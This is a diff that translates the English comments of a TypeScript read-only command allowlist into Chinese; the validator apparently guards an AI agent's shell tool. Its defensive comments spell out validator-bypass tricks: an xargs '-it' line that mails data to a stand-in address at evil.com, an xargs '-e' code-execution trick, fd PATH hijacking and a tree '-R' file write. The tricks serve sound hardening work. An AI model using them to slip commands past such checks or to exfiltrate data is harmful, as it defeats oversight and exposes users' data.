@@ -31,27 +31,27 @@ import {
 } from './pathValidation.js'
 import { sedCommandIsAllowedByAllowlist } from './sedValidation.js'
 
-// Unified command validation configuration system
+// 统一命令验证配置系统
 type CommandConfig = {
-  // A Record mapping from the command (e.g. `xargs` or `git diff`) to its safe flags and the values they accept
+  // 从命令（如 `xargs` 或 `git diff`）到其安全标志及所接受值的映射记录
   safeFlags: Record<string, FlagArgType>
-  // An optional regex that is used for additional validation beyond flag parsing
+  // 可选的用于标志解析之外额外验证的正则表达式
   regex?: RegExp
-  // An optional callback for additional custom validation logic. Returns true if the command is dangerous,
-  // false if it appears to be safe. Meant to be used in conjunction with the safeFlags-based validation.
+  // 可选的额外自定义验证逻辑回调。若命令危险则返回 true，若安全则返回 false。
+  // 旨在与基于 safeFlags 的验证配合使用。
   additionalCommandIsDangerousCallback?: (
     rawCommand: string,
     args: string[],
   ) => boolean
-  // When false, the tool does NOT respect POSIX `--` end-of-options.
-  // validateFlags will continue checking flags after `--` instead of breaking.
-  // Default: true (most tools respect `--`).
+  // 当为 false 时，工具不遵守 POSIX `--` 选项结束符。
+  // validateFlags 将在 `--` 之后继续检查标志，而不是中断。
+  // 默认值: true（大多数工具遵守 `--`）。
   respectsDoubleDash?: boolean
 }
 
-// Shared safe flags for fd and fdfind (Debian/Ubuntu package name)
-// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded —
-// they execute arbitrary commands for each search result.
+// fd 和 fdfind（Debian/Ubuntu 包名）共享的安全标志
+// 安全: -x/--exec 和 -X/--exec-batch 被故意排除 —
+// 它们会对每个搜索结果执行任意命令。
 const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '-h': 'none',
   '--help': 'none',
@@ -74,8 +74,8 @@ const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '--fixed-strings': 'none',
   '-a': 'none',
   '--absolute-path': 'none',
-  // SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess (same
-  // pathway as --exec-batch). PATH hijacking risk if malicious `ls` is on PATH.
+  // 安全: -l/--list-details 已排除 — 内部以子进程方式执行 `ls`（与
+  // --exec-batch 相同路径）。若 PATH 中存在恶意 `ls`，则有 PATH 劫持风险。
   '-L': 'none',
   '--follow': 'none',
   '-p': 'none',
@@ -122,32 +122,32 @@ const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '--format': 'string',
 }
 
-// Central configuration for allowlist-based command validation
-// All commands and flags here should only allow reading files. They should not
-// allow writing to files, executing code, or creating network requests.
+// 基于允许列表的命令验证集中配置
+// 此处的所有命令和标志应仅允许读取文件。不得
+// 允许写入文件、执行代码或发起网络请求。
 const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
   xargs: {
     safeFlags: {
       '-I': '{}',
-      // SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
-      // optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
-      // attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
-      // flag takes NO arg and `X` becomes the next positional (target command).
+      // 安全: `-i` 和 `-e`（小写）已移除 — 两者均使用 GNU getopt
+      // 可选附加参数语义（`i::`、`e::`）。参数必须
+      // 紧附（`-iX`、`-eX`）；空格分隔（`-i X`、`-e X`）意味着
+      // 该标志不接受参数，`X` 成为下一个位置参数（目标命令）。
       //
-      // `-i` (`i::` — optional replace-str):
+      // `-i`（`i::` — 可选的替换字符串）：
       //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
-      //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
-      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
+      //   验证器: -it 打包（均为 'none'）通过，tail ∈ SAFE_TARGET → break
+      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → 网络外泄
       //
-      // `-e` (`e::` — optional eof-str):
+      // `-e`（`e::` — 可选的 eof 字符串）：
       //   cat data | xargs -e EOF echo foo
-      //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
-      //   GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
-      //   → executes binary named EOF from PATH → CODE EXEC (malicious repo)
+      //   验证器: -e 将 'EOF' 作为参数消费（类型 'EOF'），echo ∈ SAFE_TARGET
+      //   GNU: -e 无附加参数 → 无 eof 字符串，'EOF' 成为目标命令
+      //   → 从 PATH 执行名为 EOF 的二进制文件 → 代码执行（恶意仓库）
       //
-      // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
-      // arg) instead — both validator and xargs agree on argument consumption.
-      // `-i`/`-e` are deprecated (GNU: "use -I instead" / "use -E instead").
+      // 请改用大写 `-I {}`（强制参数）和 `-E EOF`（POSIX、强制参数）
+      // — 验证器和 xargs 对参数消费方式一致。
+      // `-i`/`-e` 已弃用（GNU: "请使用 -I 替代" / "请使用 -E 替代"）。
       '-n': 'number',
       '-P': 'number',
       '-L': 'number',
@@ -160,7 +160,7 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-d': 'char',
     },
   },
-  // All git read-only commands from shared validation map
+  // 来自共享验证映射的所有 git 只读命令
   ...GIT_READ_ONLY_COMMANDS,
   file: {
     safeFlags: {
@@ -320,9 +320,9 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-s': 'string', // Same as -S for whatis/apropos mode
     },
   },
-  // help command - only allow bash builtin help flags to prevent attacks when
-  // help is aliased to man (e.g., in oh-my-zsh common-aliases plugin).
-  // man's -P flag allows arbitrary command execution via pager.
+  // help 命令 — 仅允许 bash 内置 help 的标志，以防止 help
+  // 被别名到 man 时的攻击（例如 oh-my-zsh 的 common-aliases 插件）。
+  // man 的 -P 标志允许通过分页器执行任意命令。
   help: {
     safeFlags: {
       '-d': 'none', // Output short description for each topic
@@ -332,337 +332,337 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
   },
   netstat: {
     safeFlags: {
-      // Safe display options
-      '-a': 'none', // Show all sockets
-      '-L': 'none', // Show listen queue sizes
-      '-l': 'none', // Print full IPv6 address
-      '-n': 'none', // Show network addresses as numbers
+      // 安全显示选项
+      '-a': 'none', // 显示所有套接字
+      '-L': 'none', // 显示监听队列大小
+      '-l': 'none', // 打印完整 IPv6 地址
+      '-n': 'none', // 以数字形式显示网络地址
 
-      // Safe filtering options
-      '-f': 'string', // Address family (inet, inet6, unix, vsock)
+      // 安全过滤选项
+      '-f': 'string', // 地址族（inet、inet6、unix、vsock）
 
-      // Safe interface options
-      '-g': 'none', // Show multicast group membership
-      '-i': 'none', // Show interface state
-      '-I': 'string', // Specific interface
+      // 安全接口选项
+      '-g': 'none', // 显示多播组成员
+      '-i': 'none', // 显示接口状态
+      '-I': 'string', // 特定接口
 
-      // Safe statistics options
-      '-s': 'none', // Show per-protocol statistics
+      // 安全统计选项
+      '-s': 'none', // 显示各协议统计信息
 
-      // Safe routing options
-      '-r': 'none', // Show routing tables
+      // 安全路由选项
+      '-r': 'none', // 显示路由表
 
-      // Safe mbuf options
-      '-m': 'none', // Show memory management statistics
+      // 安全 mbuf 选项
+      '-m': 'none', // 显示内存管理统计信息
 
-      // Safe other options
-      '-v': 'none', // Increase verbosity
+      // 其他安全选项
+      '-v': 'none', // 增加详细程度
     },
   },
   ps: {
     safeFlags: {
-      // UNIX-style process selection (these are safe)
-      '-e': 'none', // Select all processes
-      '-A': 'none', // Select all processes (same as -e)
-      '-a': 'none', // Select all with tty except session leaders
-      '-d': 'none', // Select all except session leaders
-      '-N': 'none', // Negate selection
+      // UNIX 风格进程选择（这些是安全的）
+      '-e': 'none', // 选择所有进程
+      '-A': 'none', // 选择所有进程（与 -e 相同）
+      '-a': 'none', // 选择所有带 tty 的进程，不含会话领导
+      '-d': 'none', // 选择所有进程，不含会话领导
+      '-N': 'none', // 取反选择
       '--deselect': 'none',
 
-      // UNIX-style output format (safe, doesn't show env)
-      '-f': 'none', // Full format
-      '-F': 'none', // Extra full format
-      '-l': 'none', // Long format
-      '-j': 'none', // Jobs format
-      '-y': 'none', // Don't show flags
+      // UNIX 风格输出格式（安全，不显示环境变量）
+      '-f': 'none', // 完整格式
+      '-F': 'none', // 额外完整格式
+      '-l': 'none', // 长格式
+      '-j': 'none', // 作业格式
+      '-y': 'none', // 不显示标志
 
-      // Output modifiers (safe ones)
-      '-w': 'none', // Wide output
-      '-ww': 'none', // Unlimited width
+      // 输出修饰符（安全的）
+      '-w': 'none', // 宽输出
+      '-ww': 'none', // 无限宽度
       '--width': 'number',
-      '-c': 'none', // Show scheduler info
-      '-H': 'none', // Show process hierarchy
+      '-c': 'none', // 显示调度器信息
+      '-H': 'none', // 显示进程层级
       '--forest': 'none',
       '--headers': 'none',
       '--no-headers': 'none',
-      '-n': 'string', // Set namelist file
+      '-n': 'string', // 设置名称列表文件
       '--sort': 'string',
 
-      // Thread display
-      '-L': 'none', // Show threads
-      '-T': 'none', // Show threads
-      '-m': 'none', // Show threads after processes
+      // 线程显示
+      '-L': 'none', // 显示线程
+      '-T': 'none', // 显示线程
+      '-m': 'none', // 在进程后显示线程
 
-      // Process selection by criteria
-      '-C': 'string', // By command name
-      '-G': 'string', // By real group ID
-      '-g': 'string', // By session or effective group
-      '-p': 'string', // By PID
+      // 按条件选择进程
+      '-C': 'string', // 按命令名
+      '-G': 'string', // 按真实组 ID
+      '-g': 'string', // 按会话或有效组
+      '-p': 'string', // 按 PID
       '--pid': 'string',
-      '-q': 'string', // Quick mode by PID
+      '-q': 'string', // 按 PID 快速模式
       '--quick-pid': 'string',
-      '-s': 'string', // By session ID
+      '-s': 'string', // 按会话 ID
       '--sid': 'string',
-      '-t': 'string', // By tty
+      '-t': 'string', // 按 tty
       '--tty': 'string',
-      '-U': 'string', // By real user ID
-      '-u': 'string', // By effective user ID
+      '-U': 'string', // 按真实用户 ID
+      '-u': 'string', // 按有效用户 ID
       '--user': 'string',
 
-      // Help/version
+      // 帮助/版本
       '--help': 'none',
       '--info': 'none',
       '-V': 'none',
       '--version': 'none',
     },
-    // Block BSD-style 'e' modifier which shows environment variables
-    // BSD options are letter-only tokens without a leading dash
+    // 阻止显示环境变量的 BSD 风格 'e' 修饰符
+    // BSD 选项是不带前导破折号的纯字母令牌
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
     ) => {
-      // Check for BSD-style 'e' in letter-only tokens (not -e which is UNIX-style)
-      // A BSD-style option is a token of only letters (no leading dash) containing 'e'
+      // 检查纯字母令牌中的 BSD 风格 'e'（不是 UNIX 风格的 -e）
+      // BSD 风格选项是由字母组成的令牌（无前导破折号）且包含 'e'
       return args.some(
         a => !a.startsWith('-') && /^[a-zA-Z]*e[a-zA-Z]*$/.test(a),
       )
     },
   },
   base64: {
-    respectsDoubleDash: false, // macOS base64 does not respect POSIX --
+    respectsDoubleDash: false, // macOS base64 不遵守 POSIX --
     safeFlags: {
-      // Safe decode options
-      '-d': 'none', // Decode
-      '-D': 'none', // Decode (macOS)
-      '--decode': 'none', // Decode
+      // 安全解码选项
+      '-d': 'none', // 解码
+      '-D': 'none', // 解码（macOS）
+      '--decode': 'none', // 解码
 
-      // Safe formatting options
-      '-b': 'number', // Break lines at num (macOS)
-      '--break': 'number', // Break lines at num (macOS)
-      '-w': 'number', // Wrap lines at COLS (Linux)
-      '--wrap': 'number', // Wrap lines at COLS (Linux)
+      // 安全格式化选项
+      '-b': 'number', // 在 num 字符处换行（macOS）
+      '--break': 'number', // 在 num 字符处换行（macOS）
+      '-w': 'number', // 在 COLS 列处换行（Linux）
+      '--wrap': 'number', // 在 COLS 列处换行（Linux）
 
-      // Safe input options (read from file, not write)
-      '-i': 'string', // Input file (safe for reading)
-      '--input': 'string', // Input file (safe for reading)
+      // 安全输入选项（从文件读取，非写入）
+      '-i': 'string', // 输入文件（安全读取）
+      '--input': 'string', // 输入文件（安全读取）
 
-      // Safe misc options
-      '--ignore-garbage': 'none', // Ignore non-alphabet chars when decoding (Linux)
-      '-h': 'none', // Help
-      '--help': 'none', // Help
-      '--version': 'none', // Version
+      // 安全杂项选项
+      '--ignore-garbage': 'none', // 解码时忽略非字母字符（Linux）
+      '-h': 'none', // 帮助
+      '--help': 'none', // 帮助
+      '--version': 'none', // 版本
     },
   },
   grep: {
     safeFlags: {
-      // Pattern flags
-      '-e': 'string', // Pattern
+      // 模式标志
+      '-e': 'string', // 模式
       '--regexp': 'string',
-      '-f': 'string', // File with patterns
+      '-f': 'string', // 包含模式的文件
       '--file': 'string',
-      '-F': 'none', // Fixed strings
+      '-F': 'none', // 固定字符串
       '--fixed-strings': 'none',
-      '-G': 'none', // Basic regexp (default)
+      '-G': 'none', // 基本正则（默认）
       '--basic-regexp': 'none',
-      '-E': 'none', // Extended regexp
+      '-E': 'none', // 扩展正则
       '--extended-regexp': 'none',
-      '-P': 'none', // Perl regexp
+      '-P': 'none', // Perl 正则
       '--perl-regexp': 'none',
 
-      // Matching control
-      '-i': 'none', // Ignore case
+      // 匹配控制
+      '-i': 'none', // 忽略大小写
       '--ignore-case': 'none',
       '--no-ignore-case': 'none',
-      '-v': 'none', // Invert match
+      '-v': 'none', // 反向匹配
       '--invert-match': 'none',
-      '-w': 'none', // Word regexp
+      '-w': 'none', // 单词正则
       '--word-regexp': 'none',
-      '-x': 'none', // Line regexp
+      '-x': 'none', // 整行正则
       '--line-regexp': 'none',
 
-      // Output control
-      '-c': 'none', // Count
+      // 输出控制
+      '-c': 'none', // 计数
       '--count': 'none',
       '--color': 'string',
       '--colour': 'string',
-      '-L': 'none', // Files without match
+      '-L': 'none', // 无匹配的文件
       '--files-without-match': 'none',
-      '-l': 'none', // Files with matches
+      '-l': 'none', // 含匹配的文件
       '--files-with-matches': 'none',
-      '-m': 'number', // Max count
+      '-m': 'number', // 最大计数
       '--max-count': 'number',
-      '-o': 'none', // Only matching
+      '-o': 'none', // 仅匹配部分
       '--only-matching': 'none',
-      '-q': 'none', // Quiet
+      '-q': 'none', // 安静模式
       '--quiet': 'none',
       '--silent': 'none',
-      '-s': 'none', // No messages
+      '-s': 'none', // 无错误消息
       '--no-messages': 'none',
 
-      // Output line prefix
-      '-b': 'none', // Byte offset
+      // 输出行前缀
+      '-b': 'none', // 字节偏移
       '--byte-offset': 'none',
-      '-H': 'none', // With filename
+      '-H': 'none', // 带文件名
       '--with-filename': 'none',
-      '-h': 'none', // No filename
+      '-h': 'none', // 无文件名
       '--no-filename': 'none',
       '--label': 'string',
-      '-n': 'none', // Line number
+      '-n': 'none', // 行号
       '--line-number': 'none',
-      '-T': 'none', // Initial tab
+      '-T': 'none', // 初始制表符
       '--initial-tab': 'none',
-      '-u': 'none', // Unix byte offsets
+      '-u': 'none', // Unix 字节偏移
       '--unix-byte-offsets': 'none',
-      '-Z': 'none', // Null after filename
+      '-Z': 'none', // 文件名后跟 NUL
       '--null': 'none',
-      '-z': 'none', // Null data
+      '-z': 'none', // NUL 数据
       '--null-data': 'none',
 
-      // Context control
-      '-A': 'number', // After context
+      // 上下文控制
+      '-A': 'number', // 之后上下文行数
       '--after-context': 'number',
-      '-B': 'number', // Before context
+      '-B': 'number', // 之前上下文行数
       '--before-context': 'number',
-      '-C': 'number', // Context
+      '-C': 'number', // 上下文行数
       '--context': 'number',
       '--group-separator': 'string',
       '--no-group-separator': 'none',
 
-      // File and directory selection
-      '-a': 'none', // Text (process binary as text)
+      // 文件和目录选择
+      '-a': 'none', // 文本（将二进制作为文本处理）
       '--text': 'none',
       '--binary-files': 'string',
-      '-D': 'string', // Devices
+      '-D': 'string', // 设备
       '--devices': 'string',
-      '-d': 'string', // Directories
+      '-d': 'string', // 目录
       '--directories': 'string',
       '--exclude': 'string',
       '--exclude-from': 'string',
       '--exclude-dir': 'string',
       '--include': 'string',
-      '-r': 'none', // Recursive
+      '-r': 'none', // 递归
       '--recursive': 'none',
-      '-R': 'none', // Dereference-recursive
+      '-R': 'none', // 解引用递归
       '--dereference-recursive': 'none',
 
-      // Other options
+      // 其他选项
       '--line-buffered': 'none',
-      '-U': 'none', // Binary
+      '-U': 'none', // 二进制
       '--binary': 'none',
 
-      // Help and version
+      // 帮助和版本
       '--help': 'none',
       '-V': 'none',
       '--version': 'none',
     },
   },
   ...RIPGREP_READ_ONLY_COMMANDS,
-  // Checksum commands - these only read files and compute/verify hashes
-  // All flags are safe as they only affect output format or verification behavior
+  // 校验和命令 — 这些仅读取文件并计算/验证哈希
+  // 所有标志均安全，因为它们只影响输出格式或验证行为
   sha256sum: {
     safeFlags: {
-      // Mode flags
-      '-b': 'none', // Binary mode
+      // 模式标志
+      '-b': 'none', // 二进制模式
       '--binary': 'none',
-      '-t': 'none', // Text mode
+      '-t': 'none', // 文本模式
       '--text': 'none',
 
-      // Check/verify flags
-      '-c': 'none', // Verify checksums from file
+      // 检查/验证标志
+      '-c': 'none', // 从文件验证校验和
       '--check': 'none',
-      '--ignore-missing': 'none', // Ignore missing files during check
-      '--quiet': 'none', // Quiet mode during check
-      '--status': 'none', // Don't output, exit code shows success
-      '--strict': 'none', // Exit non-zero for improperly formatted lines
-      '-w': 'none', // Warn about improperly formatted lines
+      '--ignore-missing': 'none', // 检查时忽略缺失文件
+      '--quiet': 'none', // 检查时安静模式
+      '--status': 'none', // 不输出，仅通过退出码表示成功
+      '--strict': 'none', // 格式不正确的行返回非零退出码
+      '-w': 'none', // 警告格式不正确的行
       '--warn': 'none',
 
-      // Output format flags
-      '--tag': 'none', // BSD-style output
-      '-z': 'none', // End output lines with NUL
+      // 输出格式标志
+      '--tag': 'none', // BSD 风格输出
+      '-z': 'none', // 以 NUL 结束输出行
       '--zero': 'none',
 
-      // Help and version
+      // 帮助和版本
       '--help': 'none',
       '--version': 'none',
     },
   },
   sha1sum: {
     safeFlags: {
-      // Mode flags
-      '-b': 'none', // Binary mode
+      // 模式标志
+      '-b': 'none', // 二进制模式
       '--binary': 'none',
-      '-t': 'none', // Text mode
+      '-t': 'none', // 文本模式
       '--text': 'none',
 
-      // Check/verify flags
-      '-c': 'none', // Verify checksums from file
+      // 检查/验证标志
+      '-c': 'none', // 从文件验证校验和
       '--check': 'none',
-      '--ignore-missing': 'none', // Ignore missing files during check
-      '--quiet': 'none', // Quiet mode during check
-      '--status': 'none', // Don't output, exit code shows success
-      '--strict': 'none', // Exit non-zero for improperly formatted lines
-      '-w': 'none', // Warn about improperly formatted lines
+      '--ignore-missing': 'none', // 检查时忽略缺失文件
+      '--quiet': 'none', // 检查时安静模式
+      '--status': 'none', // 不输出，仅通过退出码表示成功
+      '--strict': 'none', // 格式不正确的行返回非零退出码
+      '-w': 'none', // 警告格式不正确的行
       '--warn': 'none',
 
-      // Output format flags
-      '--tag': 'none', // BSD-style output
-      '-z': 'none', // End output lines with NUL
+      // 输出格式标志
+      '--tag': 'none', // BSD 风格输出
+      '-z': 'none', // 以 NUL 结束输出行
       '--zero': 'none',
 
-      // Help and version
+      // 帮助和版本
       '--help': 'none',
       '--version': 'none',
     },
   },
   md5sum: {
     safeFlags: {
-      // Mode flags
-      '-b': 'none', // Binary mode
+      // 模式标志
+      '-b': 'none', // 二进制模式
       '--binary': 'none',
-      '-t': 'none', // Text mode
+      '-t': 'none', // 文本模式
       '--text': 'none',
 
-      // Check/verify flags
-      '-c': 'none', // Verify checksums from file
+      // 检查/验证标志
+      '-c': 'none', // 从文件验证校验和
       '--check': 'none',
-      '--ignore-missing': 'none', // Ignore missing files during check
-      '--quiet': 'none', // Quiet mode during check
-      '--status': 'none', // Don't output, exit code shows success
-      '--strict': 'none', // Exit non-zero for improperly formatted lines
-      '-w': 'none', // Warn about improperly formatted lines
+      '--ignore-missing': 'none', // 检查时忽略缺失文件
+      '--quiet': 'none', // 检查时安静模式
+      '--status': 'none', // 不输出，仅通过退出码表示成功
+      '--strict': 'none', // 格式不正确的行返回非零退出码
+      '-w': 'none', // 警告格式不正确的行
       '--warn': 'none',
 
-      // Output format flags
-      '--tag': 'none', // BSD-style output
-      '-z': 'none', // End output lines with NUL
+      // 输出格式标志
+      '--tag': 'none', // BSD 风格输出
+      '-z': 'none', // 以 NUL 结束输出行
       '--zero': 'none',
 
-      // Help and version
+      // 帮助和版本
       '--help': 'none',
       '--version': 'none',
     },
   },
-  // tree command - moved from READONLY_COMMAND_REGEXES to allow flags and path arguments
-  // -o/--output writes to a file, so it's excluded. All other flags are display/filter options.
+  // tree 命令 — 从 READONLY_COMMAND_REGEXES 迁移以支持标志和路径参数
+  // -o/--output 会写入文件，因此已排除。所有其他标志均为显示/过滤选项。
   tree: {
     safeFlags: {
-      // Listing options
-      '-a': 'none', // All files
-      '-d': 'none', // Directories only
-      '-l': 'none', // Follow symlinks
-      '-f': 'none', // Full path prefix
-      '-x': 'none', // Stay on current filesystem
-      '-L': 'number', // Max depth
-      // SECURITY: -R REMOVED. tree -R combined with -H (HTML mode) and -L (depth)
-      // WRITES 00Tree.html files to every subdirectory at the depth boundary.
-      // From man tree (< 2.1.0): "-R — at each of them execute tree again
-      // adding `-o 00Tree.html` as a new option." The comment "Rerun at max
-      // depth" was misleading — the "rerun" includes a hardcoded -o file write.
-      // `tree -R -H . -L 2 /path` → writes /path/<subdir>/00Tree.html for each
-      // subdir at depth 2. FILE WRITE, zero permissions.
-      '-P': 'string', // Include pattern
-      '-I': 'string', // Exclude pattern
+      // 列表选项
+      '-a': 'none', // 所有文件
+      '-d': 'none', // 仅目录
+      '-l': 'none', // 跟随符号链接
+      '-f': 'none', // 完整路径前缀
+      '-x': 'none', // 停留在当前文件系统
+      '-L': 'number', // 最大深度
+      // 安全: -R 已移除。tree -R 结合 -H（HTML 模式）和 -L（深度）
+      // 会向深度边界的每个子目录写入 00Tree.html 文件。
+      // 根据 man tree（< 2.1.0）："-R — 在每个子目录再次执行 tree，
+      // 并添加 `-o 00Tree.html` 作为新选项。" "在最大深度重新运行"
+      // 的描述具有误导性——"重新运行"包含硬编码的 -o 文件写入。
+      // `tree -R -H . -L 2 /path` → 向深度 2 的每个子目录写入
+      // /path/<subdir>/00Tree.html。文件写入，零权限。
+      '-P': 'string', // 包含模式
+      '-I': 'string', // 排除模式
       '--gitignore': 'none',
       '--gitfile': 'string',
       '--ignore-case': 'none',
@@ -674,91 +674,91 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '--noreport': 'none',
       '--charset': 'string',
       '--filelimit': 'number',
-      // File display options
-      '-q': 'none', // Non-printable as ?
-      '-N': 'none', // Non-printable as-is
-      '-Q': 'none', // Quote filenames
-      '-p': 'none', // Protections
-      '-u': 'none', // Owner
-      '-g': 'none', // Group
-      '-s': 'none', // Size bytes
-      '-h': 'none', // Human-readable sizes
+      // 文件显示选项
+      '-q': 'none', // 不可打印字符显示为 ?
+      '-N': 'none', // 不可打印字符原样显示
+      '-Q': 'none', // 引用文件名
+      '-p': 'none', // 权限
+      '-u': 'none', // 所有者
+      '-g': 'none', // 组
+      '-s': 'none', // 大小（字节）
+      '-h': 'none', // 人类可读大小
       '--si': 'none',
       '--du': 'none',
-      '-D': 'none', // Last modification time
+      '-D': 'none', // 最后修改时间
       '--timefmt': 'string',
-      '-F': 'none', // Append indicator
+      '-F': 'none', // 追加指示符
       '--inodes': 'none',
       '--device': 'none',
-      // Sorting options
-      '-v': 'none', // Version sort
-      '-t': 'none', // Sort by mtime
-      '-c': 'none', // Sort by ctime
-      '-U': 'none', // Unsorted
-      '-r': 'none', // Reverse sort
+      // 排序选项
+      '-v': 'none', // 版本排序
+      '-t': 'none', // 按 mtime 排序
+      '-c': 'none', // 按 ctime 排序
+      '-U': 'none', // 不排序
+      '-r': 'none', // 反向排序
       '--dirsfirst': 'none',
       '--filesfirst': 'none',
       '--sort': 'string',
-      // Graphics/output options
-      '-i': 'none', // No indentation lines
-      '-A': 'none', // ANSI line graphics
-      '-S': 'none', // CP437 line graphics
-      '-n': 'none', // No color
-      '-C': 'none', // Color
-      '-X': 'none', // XML output
-      '-J': 'none', // JSON output
-      '-H': 'string', // HTML output with base HREF
+      // 图形/输出选项
+      '-i': 'none', // 无缩进线
+      '-A': 'none', // ANSI 线条图形
+      '-S': 'none', // CP437 线条图形
+      '-n': 'none', // 无颜色
+      '-C': 'none', // 颜色
+      '-X': 'none', // XML 输出
+      '-J': 'none', // JSON 输出
+      '-H': 'string', // 带基础 HREF 的 HTML 输出
       '--nolinks': 'none',
       '--hintro': 'string',
       '--houtro': 'string',
-      '-T': 'string', // HTML title
+      '-T': 'string', // HTML 标题
       '--hyperlink': 'none',
       '--scheme': 'string',
       '--authority': 'string',
-      // Input options (read from file, not write)
+      // 输入选项（从文件读取，非写入）
       '--fromfile': 'none',
       '--fromtabfile': 'none',
       '--fflinks': 'none',
-      // Help and version
+      // 帮助和版本
       '--help': 'none',
       '--version': 'none',
     },
   },
-  // date command - moved from READONLY_COMMANDS because -s/--set can set system time
-  // Also -f/--file can be used to read dates from file and set time
-  // We only allow safe display options
+  // date 命令 — 从 READONLY_COMMANDS 迁移，因为 -s/--set 可设置系统时间
+  // 此外 -f/--file 可从文件读取日期并设置时间
+  // 我们只允许安全显示选项
   date: {
     safeFlags: {
-      // Display options (safe - don't modify system time)
-      '-d': 'string', // --date=STRING - display time described by STRING
+      // 显示选项（安全 — 不修改系统时间）
+      '-d': 'string', // --date=STRING — 显示由 STRING 描述的时间
       '--date': 'string',
-      '-r': 'string', // --reference=FILE - display file's modification time
+      '-r': 'string', // --reference=FILE — 显示文件的修改时间
       '--reference': 'string',
-      '-u': 'none', // --utc - use UTC
+      '-u': 'none', // --utc — 使用 UTC
       '--utc': 'none',
       '--universal': 'none',
-      // Output format options
-      '-I': 'none', // --iso-8601 (can have optional argument, but none type handles bare flag)
+      // 输出格式选项
+      '-I': 'none', // --iso-8601（可有可选参数，但 none 类型处理裸标志）
       '--iso-8601': 'string',
       '-R': 'none', // --rfc-email
       '--rfc-email': 'none',
       '--rfc-3339': 'string',
-      // Debug/help
+      // 调试/帮助
       '--debug': 'none',
       '--help': 'none',
       '--version': 'none',
     },
-    // Dangerous flags NOT included (blocked by omission):
-    // -s / --set - sets system time
-    // -f / --file - reads dates from file (can be used to set time in batch)
-    // CRITICAL: date positional args in format MMDDhhmm[[CC]YY][.ss] set system time
-    // Use callback to verify positional args start with + (format strings like +"%Y-%m-%d")
+    // 未包含的危险标志（通过省略来阻止）：
+    // -s / --set — 设置系统时间
+    // -f / --file — 从文件读取日期（可用于批量设置时间）
+    // 关键: MMDDhhmm[[CC]YY][.ss] 格式的 date 位置参数会设置系统时间
+    // 使用回调验证位置参数以 + 开头（格式字符串如 +"%Y-%m-%d"）
     additionalCommandIsDangerousCallback: (
       _rawCommand: string,
       args: string[],
     ) => {
-      // args are already parsed tokens after "date"
-      // Flags that require an argument
+      // args 是 "date" 之后已解析的令牌
+      // 需要参数的标志
       const flagsWithArgs = new Set([
         '-d',
         '--date',
@@ -770,39 +770,39 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       let i = 0
       while (i < args.length) {
         const token = args[i]!
-        // Skip flags and their arguments
+        // 跳过标志及其参数
         if (token.startsWith('--') && token.includes('=')) {
-          // Long flag with =value, already consumed
+          // 带 =value 的长标志，已消费
           i++
         } else if (token.startsWith('-')) {
-          // Flag - check if it takes an argument
+          // 标志 — 检查是否接受参数
           if (flagsWithArgs.has(token)) {
-            i += 2 // Skip flag and its argument
+            i += 2 // 跳过标志及其参数
           } else {
-            i++ // Just skip the flag
+            i++ // 仅跳过标志
           }
         } else {
-          // Positional argument - must start with + for format strings
-          // Anything else (like MMDDhhmm) could set system time
+          // 位置参数 — 必须以 + 开头才是格式字符串
+          // 其他任何内容（如 MMDDhhmm）都可能设置系统时间
           if (!token.startsWith('+')) {
-            return true // Dangerous
+            return true // 危险
           }
           i++
         }
       }
-      return false // Safe
+      return false // 安全
     },
   },
-  // hostname command - moved from READONLY_COMMANDS because positional args set hostname
-  // Also -F/--file sets hostname from file, -b/--boot sets default hostname
-  // We only allow safe display options and BLOCK any positional arguments
+  // hostname 命令 — 从 READONLY_COMMANDS 迁移，因为位置参数可设置主机名
+  // 此外 -F/--file 从文件设置主机名，-b/--boot 设置默认主机名
+  // 我们只允许安全显示选项并阻止任何位置参数
   hostname: {
     safeFlags: {
-      // Display options only (safe)
-      '-f': 'none', // --fqdn - display FQDN
+      // 仅显示选项（安全）
+      '-f': 'none', // --fqdn — 显示完全限定域名
       '--fqdn': 'none',
       '--long': 'none',
-      '-s': 'none', // --short - display short name
+      '-s': 'none', // --short — 显示短名称
       '--short': 'none',
       '-i': 'none', // --ip-address
       '--ip-address': 'none',
@@ -821,28 +821,28 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-V': 'none', // --version
       '--version': 'none',
     },
-    // CRITICAL: Block any positional arguments - they set the hostname
-    // Also block -F/--file, -b/--boot, -y/--yp/--nis (not in safeFlags = blocked)
-    // Use regex to ensure no positional args after flags
+    // 关键: 阻止任何位置参数 — 它们会设置主机名
+    // 同时阻止 -F/--file、-b/--boot、-y/--yp/--nis（不在 safeFlags 中 = 被阻止）
+    // 使用正则确保标志之后无位置参数
     regex: /^hostname(?:\s+(?:-[a-zA-Z]|--[a-zA-Z-]+))*\s*$/,
   },
-  // info command - moved from READONLY_COMMANDS because -o/--output writes to files
-  // Also --dribble writes keystrokes to file, --init-file loads custom config
-  // We only allow safe display/navigation options
+  // info 命令 — 从 READONLY_COMMANDS 迁移，因为 -o/--output 会写入文件
+  // 此外 --dribble 将按键记录写入文件，--init-file 加载自定义配置
+  // 我们只允许安全显示/导航选项
   info: {
     safeFlags: {
-      // Navigation/display options (safe)
-      '-f': 'string', // --file - specify manual file to read
+      // 导航/显示选项（安全）
+      '-f': 'string', // --file — 指定要读取的手册文件
